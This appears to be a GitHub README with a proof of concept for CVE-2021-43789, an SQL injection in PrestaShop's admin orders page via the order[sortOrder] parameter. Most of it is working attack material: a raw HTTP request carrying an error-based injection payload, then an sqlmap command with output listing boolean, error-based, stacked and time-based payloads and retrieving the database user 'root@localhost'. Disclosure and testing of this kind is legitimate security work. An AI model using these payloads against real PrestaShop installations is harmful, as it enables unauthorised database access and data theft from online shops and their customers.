# CVE-2021-43789

Prestashop >= 1.7.5.0 < 1.7.8.2  - SQL injection 
 
 
# POC 

```
GET /prestashop_1.7.8.1/admin860ykaqhn/index.php/sell/orders/?_token=tPhFxoTyY8HLoCWbfVDKdY8Io_1BVL3ZVebYNljeM9M&order[orderBy]=id_order&order[sortOrder]= AND (SELECT 2331 FROM(SELECT COUNT(*),CONCAT(0,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,51)),0,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) HTTP/1.1
Host: local.numanturle.com
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: tr,en;q=0.9,tr-TR;q=0.8,en-US;q=0.7,el;q=0.6,zh-CN;q=0.5,zh;q=0.4
Cookie: PrestaShop-fb3a512f86ce3d74c1267be8ecf0ef58=def50200cccdb6bd74736c17c4b18959bc636b2dbda46341dae97645a276771ad29535f4e9a9ccc76d5b3e1115ec56a6e927a394cc917b9b69b7b464c6cfe819888c9315c8a67942d6b51bed1ebe6620e4c936520544950c05353d26b45ca12991e8b73be7326385d2b88d1b11ca72b756231861da98ffc30cc463be76a69c2ba89c833a0d6a8f99c2424a5fac81093f91a8867effb6b460d4019cbd1deb94216752693bce45be6a375ee8dcff6ed2d2b6e552963980703d3778b8f437c49e79dbc5f17d76dbca8526943dc8a80668d2685eb54729b79fecc24a32cdf5598d73dce6ede74d7d3e327c142881513f9727fbab6b6e84c7f26670aeeea6d7576ec96709f081273ab52357637e93cec76ebd0ccea7bebbfb905ba82ff307228688c1dcc2678bf9d3a9d5ca2ad98eec05ca485aafbf902c99aac2f850c409e502cc64685fc26797193222054f064c377db4d4d0546d3d69afa317bfe82b0c8ce9fdfd21d4881527a6ed70e44e6ae7e37d306e059b1363b4a9e46c28a8cfd8481263dd105a32757ac1c7e5bc570e6289decc2e17446cc3bf5626810adb28bf3f19177673f2bfe008ed6ebd018ac0b96e23c17b8ee1f0d288bf580b31bea160d73acbc4a13ede20d1ddbe4f0c044f4f79be79c00b7e49d2379c4e9fcec1261b53be28a08353; PrestaShop-814b8fab920555b0600c89dfaec95917=def50200947265e9dfeaf2327f83e25c351d2d15061cc0465a557b193553092c0c422a4f73eea7d2efc1267f6e4825daceecaf54446245e6aca475927be6487f5f40ab38f59a74167b9fb8cd975b581629032c04bd4934794d6aa85917c5e19a0ced593cb606eb03d70b2acdcd6341844f38e9a7fb816b9a590cb8dc611ccccaa14d3d9821483d0e63c5d6ec9068d705e1f6653d79e093becb03cf931eee70e5e4d15b6488325fb222e9c5e8ea771c8ed0e43a9b85732e54c52d526956ed597737ea233a1f46783be153443695e86e4fa61cd98ee4fcd7bf814cba7e58098048f1479520dd448bb76a500d171f61555ffd45a7932ae814295f3649d5e460d8d259fa683b68bf31c236411310; PHPSESSID=tb5ghicleq05vjbtpl68m3vos5; redux_current_tab=undefined; redux_current_tab_get=undefined; redux_current_tab_redux_demo=62; install_2bf74e3c9640=rmk2td282sltkivea512ms5mrp
Connection: close


```


```
sqlmap.py -r sql.r --dbms=mysql --risk 3 --thread 10 --proxy=http://127.0.0.1:8080 --current-user
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.10.17#dev}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:14:33 /2022-01-28/

[03:14:33] [INFO] parsing HTTP request from 'sql.r'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[03:14:35] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[03:14:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://local.numanturle.com:80/prestashop_1.7.8.1/admin860ykaqhn/index.php/sell/orders/?_token=tPhFxoTyY8HLoCWbfVDKdY8Io_1BVL3ZVebYNljeM9M&order[orderBy]=id_order&order[sortOrder]= RLIKE (SELECT (CASE WHEN (6486=6486) THEN '' ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://local.numanturle.com:80/prestashop_1.7.8.1/admin860ykaqhn/index.php/sell/orders/?_token=tPhFxoTyY8HLoCWbfVDKdY8Io_1BVL3ZVebYNljeM9M&order[orderBy]=id_order&order[sortOrder]= AND (SELECT 2100 FROM(SELECT COUNT(*),CONCAT(0x7178627a71,(SELECT (ELT(2100=2100,1))),0x7170627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://local.numanturle.com:80/prestashop_1.7.8.1/admin860ykaqhn/index.php/sell/orders/?_token=tPhFxoTyY8HLoCWbfVDKdY8Io_1BVL3ZVebYNljeM9M&order[orderBy]=id_order&order[sortOrder]=;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://local.numanturle.com:80/prestashop_1.7.8.1/admin860ykaqhn/index.php/sell/orders/?_token=tPhFxoTyY8HLoCWbfVDKdY8Io_1BVL3ZVebYNljeM9M&order[orderBy]=id_order&order[sortOrder]= AND (SELECT 4707 FROM (SELECT(SLEEP(5)))kLvV)
---
[03:14:37] [INFO] testing MySQL
[03:14:37] [INFO] confirming MySQL
[03:14:38] [WARNING] reflective value(s) found and filtering out
[03:14:38] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.27, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[03:14:38] [INFO] fetching current user
[03:14:39] [INFO] retrieved: 'root@localhost'
current user: 'root@localhost'
[03:14:39] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[03:14:39] [INFO] fetched data logged to text files under 'C:\Users\dark\AppData\Local\sqlmap\output\local.numanturle.com'

[*] ending @ 03:14:39 /2022-01-28/
```

![PHP](img/php.jpg?raw=true "PHP")
![PHP](img/burp.jpg?raw=true "PHP")
![PHP](img/sqlmap.jpg?raw=true "PHP")


# Reference
 * [CVE-2021-43789](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43789)
 * [Blind SQLi using Search filters](https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-6xxj-gcjq-wgf4)
 * [Git](https://github.com/PrestaShop/PrestaShop/commit/7c44b28c134b6ca28c5dd86be6e620296f46f6ae#diff-b9ae09fddb971742b63965f43a9a15798272819e3c034e528a6314a23fb061f4)
